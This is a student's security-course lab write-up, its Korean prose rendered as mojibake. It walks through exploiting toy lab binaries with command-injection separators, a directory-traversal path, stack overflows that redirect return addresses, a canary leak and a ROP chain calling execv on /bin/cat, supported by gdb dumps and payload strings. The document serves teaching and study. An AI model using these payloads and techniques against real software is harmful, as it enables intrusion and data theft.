
# Lab #1

## 1-2 `list.c`
> Key Idea: Command Injectionì˜ ì·¨ì•½ì 
> '||', '&&', ';'...

## 1-3 `logger.c`
> Key Idea: Directory Traversal Attack
> "logs/../secret.txt"


# Lab #2

## 2-2 `echo2.c`
> Key Idea: scanfë¡œ BOFë¥¼ í†µí•œ return address ìˆ˜ì •

#### Observation

`disas echo`ë¥¼ í†µí•´ `echo()`ì˜ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ ê´€ì°°í•˜ë©´ ë¨¼ì € rsp+0x68 ë§Œí¼ì˜ Stack Sectionì„ í™•ë³´í•˜ê³  ì‹œì‘í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.
ê·¸ë ‡ë‹¤ëŠ” ëœ»ì€ rsp+0x68ì˜ ìœ„ì¹˜ì— return addressê°€ ìˆì„ ê±°ë¼ëŠ” ëœ»ì´ë‹¤.
```nasm
   0x000000000040122c <+0>:     sub    $0x68,%rsp
   0x0000000000401230 <+4>:     mov    $0x40204e,%edi
```

ìš°ë¦¬ê°€ ëŒ€ì²´í•´ì•¼ í•  return addressì˜ ì£¼ì†ŒëŠ” `disas print_secret`ë¥¼ í†µí•´ `0x4011a6`ì´ë¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.
```nasm
Dump of assembler code for function print_secret:
   0x00000000004011a6 <+0>:     push   %rbx
```

#### Attack

rsp+38ì— ì ‘ê·¼í•˜ëŠ” ë°©ë²•ì€ scanfì˜ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ BOFë¥¼ ì¼ìœ¼í‚¤ëŠ” ê²ƒì¸ë°, scanfì˜ ë‘ë²ˆì§¸ì— ì „ë‹¬í•˜ëŠ” ì¸ì rsië¥¼ ì‚´í´ë³´ë©´ rsp+0x30ì„ ì „ë‹¬í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.
```nasm
   0x000000000040126a <+62>:    lea    0x30(%rsp),%rsi
   0x000000000040126f <+67>:    mov    $0x402068,%edi
   0x0000000000401274 <+72>:    mov    $0x0,%eax
   0x0000000000401279 <+77>:    call   0x4010a0 <__isoc99_scanf@plt>
```

ë”°ë¼ì„œ scanfì— `byte * 0x38(0x68-0x30) + return address`ë¥¼ ì „ë‹¬í•˜ë©´ BOFë¥¼ í†µí•´ rsp+0x68ì— í•´ë‹¹í•˜ëŠ” ê³µê°„ì˜ ê°’ì„ ìˆ˜ì •í•  ìˆ˜ ìˆë‹¤. (ë°‘ì˜ ì˜ˆì—ì„  "BCDE" ì „ë‹¬)
```nasm
Input your second message:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE ("A" * 0x38 + "BCDE")

Breakpoint 1, 0x000000000040127e in echo ()
(gdb) x/14xg $rsp
0x7fffffffd6a0: 0x0000000000000a61      0x0000000000000000
0x7fffffffd6b0: 0x0000000000000000      0x0000000000000000
0x7fffffffd6c0: 0x0000000000000000      0x0000000000000000
0x7fffffffd6d0: 0x4141414141414141      0x4141414141414141
0x7fffffffd6e0: 0x4141414141414141      0x4141414141414141
0x7fffffffd6f0: 0x4141414141414141      0x4141414141414141
0x7fffffffd700: 0x4141414141414141      0x0000000045444342     # EDCB(Little Endian)
```

(!) Little Endianì´ë¯€ë¡œ Return Addressë¥¼ gdbë¡œ ì¶œë ¥ë˜ëŠ” ê²ƒê³¼ ë°˜ëŒ€ë¡œ ì „ë‹¬í•´ì•¼í•¨ì— ìœ ì˜í•˜ì.
- `0x4011a6` -> `"\0xa6\0x11\0x40"`

ê²°ê³¼ì ìœ¼ë¡œ ret ìˆ˜í–‰ì„ í†µí•´ `print_secret()`ì— ì ‘ê·¼í•  ìˆ˜ ìˆê²Œëœë‹¤.

----------------------

## 2-3 `guess.c`
> Key Idea: scanfë¥¼ ì´ìš©í•œ passcode ìˆ˜ì •

#### Observation

ì´ë²ˆ ë¬¸ì œëŠ” Canaryê°€ ì ìš©ë˜ì–´ìˆìœ¼ë¯€ë¡œ **2-2**ì²˜ëŸ¼ `scanf()`ì™€ ê°™ì€ BOF ì·¨ì•½ í•¨ìˆ˜ë¥¼ í†µí•´ Stack Sectionì„ ë„˜ì–´ return address ì£¼ì†Œë¥¼ ìˆ˜ì •í•˜ëŠ” ê²ƒì€ í•  ìˆ˜ ì—†ë‹¤.
ê·¸ë ‡ë‹¤ë©´ ì–´ë–»ê²Œ ì ‘ê·¼í•´ì•¼í• ê¹Œ?

ì½”ë“œë¥¼ ë³´ë©´ inputì— *8ì ì´ìƒì˜ passcode*ë¥¼ ì „ë‹¬í•˜ë©´ `print_secret()`ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” êµ¬ì¡°ì¸ ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.
```c
    if (strcmp(input, passcode) == 0) {
      print_secret();
    }
```

gdbë¥¼ í†µí•´ ì‹¤ì œ passcodeëŠ” ë¬´ì—‡ì¸ì§€ ì•Œì•„ë‚´ë³´ì.
`disas main()`ì„ ìˆ˜í–‰ í›„ `load_passcode(passcode, PASSCODE_LEN)`ì˜ ì²« ë²ˆì§¸ ì¸ìë¥¼ ê´€ì°°í•˜ë©´ passcodeê°€ ë¬´ì—‡ì¸ì§€ ì•Œ ìˆ˜ ìˆìœ¼ë¯€ë¡œ `load_passcode`ê°€ ìˆ˜í–‰ë˜ê³  ë‚œ ë’¤ì˜ %rdië¥¼ ê´€ì°°í•´ë³´ì.
```nasm
   0x0000000000401419 <+85>:    mov    $0x10,%esi
   0x000000000040141e <+90>:    mov    %rax,%rdi
   0x0000000000401421 <+93>:    call   0x4012cb <load_passcode>
   0x0000000000401426 <+98>:    movb   $0x0,0x40(%rsp)
   0x000000000040142b <+103>:   movl   $0x1,0xc(%rsp)
   ...
Breakpoint 1, 0x0000000000401433 in main ()
(gdb) x/s $rdi
0x7ffff7fa4860 <unsafe_state>:  "PB\372\367\377\177"
```
ë‹¤ìŒê³¼ ê°™ì´ 8ê¸€ì ë¯¸ë§Œì¸ ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.

ë”°ë¼ì„œ ë‹¤ìŒê³¼ ê°™ì€ ì¶”ë¡ ì„ í•  ìˆ˜ ìˆë‹¤.
- (X) passcode ê°’ì„ ì•Œì•„ë‚´ì„œ inputì— ì§‘ì–´ë„£ëŠ” ê²ƒ ë§Œìœ¼ë¡  `strlen()` ifë¬¸ì— ê±¸ë¦´ê²ƒì´ë‹¤.
- (O) ê·¸ë ‡ë‹¤ë©´ ì°¨ë¼ë¦¬ `scanf`ë¥¼ ì´ìš©í•˜ì—¬ passcode ìì²´ì˜ ê°’ì„ 8ê¸€ì ì´ìƒì˜ ë‚´ê°€ ì•Œê³ ìˆëŠ” ê°’ìœ¼ë¡œ ë°”ê¿”ë²„ë¦¬ì. passcodeëŠ” ì§€ì—­ ë³€ìˆ˜ì´ë¯€ë¡œ Stack Section ë‚´ì— ìˆê¸° ë•Œë¬¸ì— Canaryì— ê±¸ë¦¬ì§€ ì•ŠëŠ”ë‹¤.

#### Attack

ê·¸ë ‡ë‹¤ë©´ inputê³¼ passcodeì˜ ìƒëŒ€ì  ìœ„ì¹˜ë¥¼ ì•Œì•„ë‚´ë³´ì.
`main()`ì˜ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ ë³´ë©´ inputì€ rsp+0x10ìœ„ì¹˜ì—, passcodeëŠ” rsp+0x30 ìœ„ì¹˜ì— ìˆëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.
```nasm
   0x0000000000401414 <+80>:    lea    0x30(%rsp),%rax   # rsp+0x30
   0x0000000000401419 <+85>:    mov    $0x10,%esi
   0x000000000040141e <+90>:    mov    %rax,%rdi
   0x0000000000401421 <+93>:    call   0x4012cb <load_passcode>
   ...
   0x000000000040144d <+137>:   lea    0x10(%rsp),%rax   # rsp+0x10
   0x0000000000401452 <+142>:   mov    %rax,%rsi
   0x0000000000401455 <+145>:   mov    $0x4020ac,%edi
   0x000000000040145a <+150>:   mov    $0x0,%eax
   0x000000000040145f <+155>:   call   0x4010f0 <__isoc99_scanf@plt>
```

ê·¸ë ‡ë‹¤ë©´ `scanf()`ì— `byte * 0x20 + user define passcode + "\0x00"`ë¥¼ ì „ë‹¬í•˜ë©´ passcodeë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆë‹¤.
Stringìœ¼ë¡œ ì¸ì‹í•´ì•¼í•˜ë¯€ë¡œ ë’¤ì— Null ë¬¸ì`\0x00`ì„ ì§‘ì–´ë„£ëŠ” ê²ƒë„ ìŠì§€ ë§ì.

ğŸ”« ê·¸ë ‡ë‹¤ë©´ ì „ì²´ Exploit ê³¼ì •ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.
1. ì²« ì…ë ¥ ì‹œ passcode ìˆ˜ì •
2. ë‘ ë²ˆì§¸ ì…ë ¥ ì‹œ ìˆ˜ì •í•œ passcodeì˜ ê°’ ì…ë ¥
```
(Trial 1) What is the passcode? : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHiImHacker
Wrong passcode!
(Trial 2) What is the passcode? : HiImHacker
Secret file content is: 20d33c6e
```

ì´ë ‡ê²Œ í•˜ë©´ ë°‘ì˜ `main()`ì˜ ifë¬¸ì„ í†µê³¼í•˜ë©´ì„œ `print_secret()`ë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆê²Œëœë‹¤.
```c
if (strcmp(input, passcode) == 0) {   // input = "HiImHacker", passcode = "HiImHacker"
    print_secret();                   // Executed!
}
```

#### Chat GPT

ê¸€ì "HiImHacker"ë¥¼ ì „ë‹¬í•˜ê³  ì‹¶ì€ë° Byte ë³€í™˜ì„ í•˜ì§€ ì•Šê³  String ê·¸ëŒ€ë¡œ ì „ë‹¬í•˜ì˜€ë”ë‹ˆ ì˜¤ë¥˜ê°€ ë‚˜ ì§€í”¼í‹°ì—ê²Œ ë¬¼ì–´ë³´ì•˜ë‹¤.
ë‹¤ìŒê³¼ ê°™ì€ ë‹µë³€ì„ ì–»ì„ ìˆ˜ ìˆì—ˆë‹¤.
![600](../../../../Z.%20Docs/img/Pasted%20image%2020241016035932.png)

----------------------

## 2-4 `fund.c`
> Key Idea: `item[]` ì¸ë±ìŠ¤ ì ‘ê·¼ì„ ì´ìš©í•œ return address ìˆ˜ì •

#### Observation

ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ ì‚´í´ë³´ê¸° ì „, ë¨¼ì € C ì½”ë“œë¥¼ ì˜ ì‚´í´ë³´ì.
ì´ ì½”ë“œì˜ ê²½ìš° **2-3**ì²˜ëŸ¼ `print_secret()`ì„ ì¶œë ¥í•´ì£¼ëŠ” ì¡°ê±´ë¬¸ì´ ì—†ìœ¼ë¡œ **2-1**ì²˜ëŸ¼ return addressë¥¼ ìˆ˜ì •í•˜ì—¬ secret í•¨ìˆ˜ì— ì ‘ê·¼í•˜ëŠ” exploit ë°©ë²•ì„ ì¨ì•¼í•œë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.

Canaryê°€ ì ìš©ë˜ì–´ìˆê¸°ì—, ê·¸ë‚˜ë§ˆ ê°€ëŠ¥ì„±ìˆëŠ” ì ‘ê·¼ë²•ì„ ìƒê°í•´ë³´ìë©´ `item[]`ì˜ ì¸ë±ìŠ¤ ì ‘ê·¼ì„ ì´ìš©í•˜ëŠ” ê²ƒì´ë‹¤.
ê·¸ë ‡ë‹¤ë©´ `item[]`ì— ì ‘ê·¼ ì¤‘ì¸ `renalance_portfolio()`ì—ì„œ ì¸ë±ìŠ¤ ë³€ìˆ˜ì— ì ì ˆí•œ ê°’ì„ ì „ë‹¬í•˜ì—¬ return addressë¥¼ ê³ ì³ì•¼ í•œë‹¤ëŠ” ëœ»ì´ë‹¤.

ë¨¼ì € `disas rebalance_portfolio`ë¥¼ í†µí•´ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ ê´€ì°°í•´ë³´ì.
```nasm
Dump of assembler code for function rebalance_portfolio:
   0x00000000004013a3 <+0>:     push   %r12
   0x00000000004013a5 <+2>:     push   %rbp
   0x00000000004013a6 <+3>:     push   %rbx
   ...
   0x000000000040140d <+106>:   pop    %rbx
   0x000000000040140e <+107>:   pop    %rbp
   0x000000000040140f <+108>:   pop    %r12
```
ì—¬íƒœê¹Œì§€ ë´ì™”ë˜ rspì¸ìë¥¼ ì™”ë‹¤ê°”ë‹¤ í•˜ëŠ” êµ¬ì¡°ê°€ ì•„ë‹ˆë‹¤.

ê·¸ë ‡ë‹¤ë©´ `rebalance_portfolio()`ë¥¼ í˜¸ì¶œí•˜ëŠ” `manage_fund`ë¥¼ ì‚´í´ë³´ì.
```nasm
Dump of assembler code for function manage_fund:
   0x0000000000401423 <+0>:     sub    $0x58,%rsp
   ...
   0x0000000000401485 <+98>:    mov    %rsp,%rdi
   0x0000000000401488 <+101>:   call   0x4013a3 <rebalance_portfolio>
   ...
   0x000000000040149f <+124>:   add    $0x58,%rsp
   0x00000000004014a3 <+128>:   ret
```
ì—¬ê¸°ë¥¼ ë³´ë©´ `rebalance_portfolio()`ì— ì¸ìë¡œ rspë¥¼ ì „ë‹¬í•˜ê³  ìˆëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.

ì´ ì¸ìëŠ” ë‹¤ìŒê³¼ ê°™ì´ `rebalance_portfolio()` í•¨ìˆ˜ì—ì„œ %r12ì— í• ë‹¹ì´ ëœë‹¤.
```nasm
Dump of assembler code for function rebalance_portfolio:
   ...
   0x00000000004013a7 <+4>:     mov    %rdi,%r12
```

ê·¸ëŸ¼ ì´ %r12ëŠ” ë¬´ì—‡ì„ ìœ„í•œ ë ˆì§€ìŠ¤í„°ì¼ê¹Œ?
```nasm
Dump of assembler code for function rebalance_portfolio:
   ...
   0x00000000004013ff <+92>:    movslq %ebp,%rbp
   0x0000000000401402 <+95>:    sub    %eax,(%r12,%rbp,4)
   0x0000000000401406 <+99>:    movslq %ebx,%rbx
   0x0000000000401409 <+102>:   add    %eax,(%r12,%rbx,4)
```
ì´ ë¶€ë¶„ì„ ë³´ë©´ %r12ê°€ ë°”ë¡œ `item[]`ì— í•´ë‹¹í•˜ëŠ” ë ˆì§€ìŠ¤í„°ì¸ ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.

ì˜ˆìƒì„ í•´ë³´ë©´, rsp+0x58ì— í•´ë‹¹í•˜ëŠ” ì¥ì†Œì— return addressê°€ ìˆì„ ê²ƒì´ê³ , ì´ ê³µê°„ì€ rsp+88(22 $\times$ 4), ì¦‰ `item[22]`ì— í•´ë‹¹í•˜ëŠ” ì¥ì†Œì¸ ê²ƒì„ ì¶”ë¡ í•´ë³¼ ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.

ìš°ë¦¬ê°€ ëŒ€ì²´í•´ì•¼ í•  return addressì˜ ì£¼ì†ŒëŠ” `disas print_secret`ë¥¼ í†µí•´ `0x4011d6`ì´ë¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.
```nasm
Dump of assembler code for function print_secret:
   0x00000000004011d6 <+0>:     push   %rbx
```

#### Attack

ê·¸ëŸ¼ ë­˜ ì–´ë–»ê²Œ í•´ì„œ return addressë¥¼ ë°”ê¿”ì•¼í• ê¹Œ?
ì½”ë“œë¥¼ ë³´ë©´ `item[]`ì— ì§ì ‘ dataë¥¼ writeí•˜ëŠ” ë¶€ë¶„ì€ ì—†ë‹¤.
`int`ì˜ '+'í˜¹ì€ '-'ë§Œ ê°€ëŠ¥í•  ë¿ì´ë‹¤.

ê·¸ë ‡ë‹¤ëŠ” ëœ»ì€ ìš°ë¦¬ëŠ” ê¸°ì¡´ return addressì—ì„œ ì ì ˆíˆ ê°’ì„ ë”í•˜ê±°ë‚˜ ë¹¼ì„œ ì›í•˜ëŠ” ì£¼ì†Œ `0x4011d6`ìœ¼ë¡œ ë°”ê¿”ì¤˜ì•¼í•œë‹¤ëŠ” ëœ»ì´ë‹¤.

ê¸°ì¡´ ì£¼ì†Œë¥¼ ì•Œì•„ë³´ê¸° ìœ„í•´ ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ gdbì—ì„œ ì‹¤í–‰í•œë‹¤.
í•¨ìˆ˜ ì‹œì‘ ì‹œ `push * 2 + 0x58`ê¹Œì§€ ì½ì–´ì•¼í•˜ë¯€ë¡œ 16xgê°€ ì ì ˆí•  ê²ƒì´ë‹¤.
(!) Little Endianì— ì£¼ì˜í•˜ë©° ì¸ë±ìŠ¤ë¥¼ ì½ì–´ë‚˜ê°€ë³´ì.
```nasm
(gdb) x/2xg $r12
		item[1]    item[0]      item[3]    item[2]
0x7fffffffd6b0: 0x000186040001877b      0x0001862a00018704    # item[]ì˜ ì‹œì‘

(gdb) x/16xg $rsp #ì‹¤ì œë¡œëŠ” push ë‘ ë²ˆ ë§Œí¼ì˜ ì£¼ì†Œê°€ ë” ì˜¬ë¼ê°€ ìˆë‹¤.
0x7fffffffd690: 0x0000000000000000      0x0000000000000001
0x7fffffffd6a0: 0x00007fffffffd828      0x000000000040148d

	#	item[1]    item[0]      item[3]    item[2]
0x7fffffffd6b0: 0x000186040001877b      0x0001862a00018704
	#	item[5]    item[4]      item[7]    item[6]
0x7fffffffd6c0: 0x0001864a00018603      0x000186a900018729
	#	item[9]    item[8]      item[11]  item[10]
0x7fffffffd6d0: 0x000186a700018774      0x0001868f0001868e
	#	item[13]  item[12]      item[15]  item[14]
0x7fffffffd6e0: 0x000186b8000186ef      0x000185a6000185f1
	#	item[17]  item[16]      item[19]  item[18]
0x7fffffffd6f0: 0x0000000000000000      0x6d9532384a039a00
	#	item[21]  item[20]      item[23]  item[22]
0x7fffffffd700: 0x0000000000000001      0x00000000004014fa  # return address!
```

ì´ì œ ì‹¤ì œ return addressì˜ ê°’ì„ ì•Œì•˜ë‹¤.
ì‹¤ì œ return addressì™€ ë‚´ê°€ ë°”ê¾¸ê³  ì‹¶ì€ addressì˜ ì°¨ì´ë¥¼ ì˜¨ë¼ì¸ hex calculatorë¡œ ê³„ì‚°í•˜ì˜€ë‹¤.
![200](../../../../Z.%20Docs/img/Pasted%20image%2020241016043438.png)

ê·¸ëŸ¼ return addressë¥¼ ìˆ˜ì •í–ˆë‹¤ê³  í•˜ì. ì´ê²Œ ëì´ ì•„ë‹ˆë‹¤.
`manage_fund()`í•¨ìˆ˜ë¥¼ ë¹ ì ¸ë‚˜ì˜¤ë©° retë¥¼ í†µí•´ return addressê°€ ìˆ˜í–‰ë˜ë„ë¡ í•´ì•¼í•œë‹¤.

ğŸ”« ê·¸ë ‡ë‹¤ë©´ ì „ì²´ Exploit ê³¼ì •ì€ ë‹¤ìŒê³¼ ê°™ì„ ê²ƒì´ë‹¤.
1. menu 2ë¡œ ì§„ì…
2. ì¸ë±ìŠ¤ 22ì— í•´ë‹¹í•˜ëŠ” ê°’ì„ 804ë§Œí¼ ê°ì†Œì‹œí‚¨ë‹¤.
3. menu 3ìœ¼ë¡œ `manage_fund()` í•¨ìˆ˜ì—ì„œ exit
```
=== Manage your fund portfolio ===
1. Check your portfolio
2. Rebalance the portfolio
3. Retire from the market
(Enter 1~3): 2
Input the ID of item you want to withdraw money from: 22
Input the ID of item you want to invest more money: 2
Decide how much to move: 804        // return address changed.
=== Manage your fund portfolio ===
1. Check your portfolio
2. Rebalance the portfolio
3. Retire from the market
(Enter 1~3): 3                      // ret
Secret file content is: 272cd04e    // print_secret() Executed!
```

ê·¸ëŸ¼ ìœ„ì™€ ê°™ì´ `print_secret()`ë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆê²Œëœë‹¤.

## 2-5
> `read_memo()` iì˜ ê°’ì´ ìŒìˆ˜ì¸ì§€ ì²´í¬ë¥¼ í•˜ì§€ ì•ŠëŠ” ì ì„ ì´ìš©í•´ì„œ Canary ê°’ì˜ Memory Disclosureë¥¼ ì¼ìœ¼í‚¨ë‹¤.

N-0x18: canary
N-0x8: return addr
N: rsp
N+0x20: `marr[]`
N+0x138: canary
N+0x148: return addr

Canary ê°’ì„ ì½ì–´ì„œ memory id(2byte), modify_cnt(2byte), buf(4byte)ë¥¼ í†µí•´ ì¶œë ¥í•´ë‚¸ë‹¤. (idx = -2)
ì´ì œ ì´ê±¸ ê°€ì§€ê³  `modify_memo()`ì—ì„œ BOFë¥¼ í•  ë•Œ canary ê°’ì„ ì“°ê³  ë“¤í‚¤ì§€ ì•Šê³  ë„˜ì–´ê°„ë‹¤.

# Lab #3

## 3-1 ``

## 3-2
> Out Range Index ì ‘ê·¼ì„ í†µí•œ Memory Disclosure + ROPë¥¼ ì´ìš©í•œ Expoit

ìš°ì„  ìš°ë¦¬ê°€ `substr.bin`ì—ì„œ ì–»ì„ ìˆ˜ ìˆëŠ” ROP Gadgetì€ ë‹¤ìŒê³¼ ê°™ë‹¤.
```
rdi_gadget = 0x401333 // %rdi
rsi_gadget = 0x401331 // %rsi, %r15
```

ì½”ë“œë¥¼ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì´ `read()`ê°€ ë‘ ë²ˆ ì“°ì´ëŠ”ë°, í•œ ë²ˆì€ Global Variableì— ê°’ì„ ì €ì¥í•˜ê³  í•œ ë²ˆì€ Stack ì˜ì—­ì— ê°’ì„ ì €ì¥í•œë‹¤.
ë”°ë¼ì„œ `3-1`ì—ì„œ í–ˆë˜ ê²ƒì²˜ëŸ¼ ì²« ë²ˆì§¸ `read()`ì—ì„œ Global Variableì— `execv()`ì— ì „ë‹¬í•  ì¸ìë“¤ì„ ì„¸íŒ…í•´ì¤€ ë‹¤ìŒ, ë‘ ë²ˆì§¸ `read()`ì—ì„œ ROP Gadgetì„ ì‚¬ìš©í•˜ì—¬ `execv(argv[0], argv)`ë¥¼ ì‹¤í–‰ì‹œì¼œ secret.txtë¥¼ ì¶œë ¥í•´ë‚¸ë‹¤.
```c
	printf("[*] Input a string that you want to slice: ");
    read(0, gbuf, 128); // argv setting in gbuf
    printf("[*] Input the start and end indexes to extract with: ");
    read(0, buf, 128);  // execv(argv[0], argvv)
```

`argv[0], argv[1], argv[2]`ì˜ ë‚´ìš©ì€ ë‹¤ìŒê³¼ ê°™ì´ `3-1`ê³¼ ê°™ìœ¼ë‚˜,
Argument Pointer `argv`ë¥¼ ì „ë‹¬í•´ì£¼ëŠ” ê³¼ì •ì—ì„œ ì‹œí–‰ì°©ì˜¤ë¥¼ ì¡°ê¸ˆ ê²ªì—ˆë‹¤. `í›„ìˆ `
```c
argv[0] = "/bin/cat";
argv[1] = filepath;
argv[2] = NULL;
```

ê·¸ëŸ¼ ì´ì œ `execv()`ì˜ ì£¼ì†Œë¥¼ ì•Œì•„ì•¼ ë˜ëŠ”ë°, ASLRì˜ ì •ì±…ì— ì˜í•˜ì—¬ ì´ì— í•´ë‹¹í•˜ëŠ” GOT EntryëŠ” Programì´ ì‹œì‘ ëœ í›„ì— í• ë‹¹ë˜ê¸° ë•Œë¬¸ì— ìš°ë¦¬ëŠ” ì´ë¥¼ Programì´ ì‹œì‘ ëœ í›„ì— GOTì˜ Memory Disclosureë¥¼ í†µí•´ì„œ ì•Œì•„ë‚´ì•¼ í•œë‹¤.

ê¸°ì¤€ì´ ë  GOTëŠ” `write`ì— í•´ë‹¹í•˜ëŠ” GOTë¡œ í•˜ê² ë‹¤.
gdbë¡œ ìš°ë¦¬ê°€ Disclosureí•  Memory ì£¼ì†Œë¥¼ ì•Œì•„ë‚´ë©´ ë‹¤ìŒê³¼ ê°™ì´ `0x404020`ì— í•´ë‹¹í•˜ëŠ” ì£¼ì†Œë¥¼ Processê°€ ì‹œì‘ë˜ê³  ë‚˜ì„œ ì½ì–´ì˜¤ë©´ ëœë‹¤.
```nasm
(gdb) disas main
...
0x00000000004011f7 <+113>:   call   0x401040 <write@plt>
...
(gdb) x/i 0x401040
   0x401040 <write@plt>:        jmp    *0x2fda(%rip)        # 0x404020 <write@got.plt>
```

ì½ì–´ì˜¤ëŠ” ê²ƒì€ gbufì˜ Rangeë¥¼ ë²—ì–´ë‚œ Index ì ‘ê·¼ì„ í†µí•˜ì—¬ ê°€ëŠ¥í•˜ë‹¤.
ë‹¤ìŒê³¼ ê°™ì´ `char gbuf`ì˜ ì£¼ì†ŒëŠ” `0x4040e0`ì´ë‹¤.
```nasm
(gdb) x/s 0x4040e0
0x4040e0 <gbuf>:      ""
```

ì¦‰, `0x4040e0 - 0x404020 = 192(Decimal)`ì´ë¯€ë¡œ `gbuf[-192]`ì—ì„œ 8byteë§Œí¼(ì£¼ì†Ÿê°’ í¬ê¸°) ê°’ì„ ì½ì–´ë“¤ì´ë©´ `write()` í•¨ìˆ˜ì˜ GOT Entry, ì¦‰ ì‹¤ì œ ì£¼ì†Œë¥¼ ì•Œ ìˆ˜ ìˆë‹¤.
ì´ëŠ” ì²«ë²ˆì§¸ Iterantionì—ì„œ writeì— ë‹¤ìŒê³¼ ê°™ì´ ê°’ì„ ì „ë‹¬í•˜ë©´ í•  ìˆ˜ ìˆë‹¤.
```c
...
	write(1, gbuf -192, (-184 - (-192)));
...
```

ì´ë ‡ê²Œ í•´ì„œ stdoutì— ì¶”ì¶œí•´ë‚¸ ê°’ì„ Little Endianì„ ê³ ë ¤í•˜ì—¬ ìˆœì„œë¥¼ ë’¤ì§‘ì–´ì£¼ê³  `libc.symbols`ë¡œ ì–»ì–´ë‚¸ writeì™€ execvì˜ offset ê°’ì„ ë‹¤ìŒê³¼ ê°™ì´ ê³„ì‚°í•˜ë©´ `execv()`ì˜ ì£¼ì†Œë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.
```python
execv_addr = hex(int(write_addr_b, 16) - write_offset + execv_offset)
```

ì´ì œ Second Loopì—ì„œ ì²«ë²ˆì§¸ `gbuf`ì— ê°’ì„ ì €ì¥í•˜ëŠ” ì²« ë²ˆì§¸ `read()` í•¨ìˆ˜ì—ì„œ `execv()`ì˜ ì¸ìë¡œ ì „ë‹¬í•  ì¸ìë¥¼ ë‹¤ìŒê³¼ ê°™ì´ êµ¬ì„±í•œë‹¤.
![](../../../../Z.%20Docs/img/Pasted%20image%2020241115115440.png)
ë‹¤ìŒì˜ PintOS ê³¼ì œ pdfë¥¼ ì°¸ê³ í•˜ì—¬ Argumentë¥¼ ìŒ“ì•˜ë‹¤. `argv í¬ì¸í„° ë§ˆì§€ë§‰ì— NULLì„ ë„£ì–´ì£¼ì§€ ì•Šì•„ì„œ ê³„ì† ì˜¤ë¥˜ê°€ ë‚¬ì—ˆë‹¤..`
ì´ì œ `gbuf`ì˜ ì‹œì‘ ì£¼ì†Œê°€ `argv`, ì¦‰ Argument Pointerì˜ ì‹œì‘ ì£¼ì†Œê°€ ëœë‹¤.
![450](../../../../Z.%20Docs/img/Pasted%20image%2020241115115603.png)

ì´ì œ `execv()` í•¨ìˆ˜ì˜ ì£¼ì†Ÿê°’ê³¼ ì „ë‹¬í•  ì¸ìë„ ëª¨ë‘ ì¤€ë¹„ë˜ì—ˆìœ¼ë‹ˆ ë‚¨ì€ ê²ƒì€ ROFë¥¼ í†µí•œ Expoitë§Œ ë‚¨ì•˜ë‹¤.
mainì˜ ì–´ì…ˆë¸”ë¦¬ë¥¼ ì‚´í´ë³´ë©´, ë‘ ë²ˆì§¸ `read()`ì— ì „ë‹¬í•˜ëŠ” Stack ì¸ì `buf`ì˜ ì‹œì‘ ì£¼ì†ŒëŠ” `%rsp+10`ì´ê³ , return addressê°€ ì €ì¥ëœ, Gadgetìœ¼ë¡œ ë®ì–´ì“°ê¸° ì‹œì‘í•´ì•¼ í•˜ëŠ” ì£¼ì†Œê°€ `%rsp+0x58`ì´ë¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.
```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000401186 <+0>:     sub    $0x58,%rsp
   ...
   0x0000000000401265 <+223>:   lea    0x10(%rsp),%rsi
   0x000000000040126a <+228>:   mov    $0x0,%edi
   0x000000000040126f <+233>:   call   0x401070 <read@plt>
```

ë”°ë¼ì„œ `buf`ì— ì „ë‹¬í•  ë‚´ìš©ì„ ë‹¤ìŒê³¼ ê°™ì´ êµ¬ì„±í•œë‹¤.
![](../../../../Z.%20Docs/img/Pasted%20image%2020241115115506.png)
- `"A" * 0x48`: í•¨ìˆ˜ì˜ return addressì— ë„ë‹¬í•˜ê¸° ìœ„í•œ BOF
- `0x401333`: `%rdi`ì— ê°’ì„ ì €ì¥í•˜ê¸° ìœ„í•œ rdi Gadget
- `0x404100`: `argv[0] (/bin/cat)`, `%rdi`ì— ì „ë‹¬ í•  ê°’
- `0x401331`: `%rsi`ì— ê°’ì„ ì €ì¥í•˜ê¸° ìœ„í•œ rsi Gadget
- `0x4040e0`: `argv`, `%rsi`ì— ì „ë‹¬ í•  ê°’
- `0x0`: `%r15`ëŠ” ì“°ì´ì§€ ì•Šìœ¼ë¯€ë¡œ Dump ê°’ ì „ë‹¬
- `0x7ffb324351c0`: ì•ì„œ Memory Disclosureë¥¼ í†µí•´ ì•Œì•„ë‚¸ `execv()` ì£¼ì†Œ

ì´ë¥¼ ì „ë‹¬í•˜ê³  ë‚˜ë©´, ìš°ë¦¬ëŠ” ROPë¥¼ í†µí•˜ì—¬ `execv(argv[0], argv)`ë¥¼ ì‹¤í–‰ ì‹œì¼œ `secret.txt`ì˜ ê°’ì„ ì¶œë ¥í•  ìˆ˜ ìˆë‹¤.

## 3-3
> Format String Bugë¥¼ í†µí•œ Dataê°’ ì½ì–´ì˜¤ê¸°

